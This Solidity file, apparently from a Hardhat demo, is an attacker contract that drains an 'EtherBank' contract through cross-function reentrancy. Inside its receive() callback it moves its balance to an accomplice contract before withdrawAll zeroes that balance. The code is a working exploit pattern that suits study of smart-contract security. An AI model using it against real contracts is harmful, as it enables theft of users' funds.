// SPDX-License-Identifier: unlicensed
pragma solidity ^0.8.0;

import "./EtherBank.interface.sol";
import "hardhat/console.sol";

contract CrossFunctionAttacker {
    IEtherBank private etherBank;
    CrossFunctionAttacker private accomplice;

    constructor() payable {}

    function setEtherBankAddress(address payable _etherBankAddress) external {
        etherBank = IEtherBank(_etherBankAddress);
    }

    function setAccompliceAddress(address payable _accompliceAddress) external {
        accomplice = CrossFunctionAttacker(_accompliceAddress);
    }

    receive() external payable {
        console.log("--------- Executing reentrancy attack ---------");
        console.log("Bank balance: %s", etherBank.getBalance() / 1 ether);
        if (etherBank.getBalance() >= 1 ether) {
            etherBank.transfer(
                address(accomplice),
                etherBank.getUserBalance(address(this))
            );
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function attackInit() external payable {
        etherBank.deposit{value: 1 ether}();
        this.attack();
    }

    function attack() external payable {
        console.log(
            "Attacker1 balance: %s, Attacker2 balance: %s\n",
            address(this).balance / 1 ether,
            accomplice.getBalance() / 1 ether
        );
        etherBank.withdrawAll();
        accomplice.attack();
    }
}
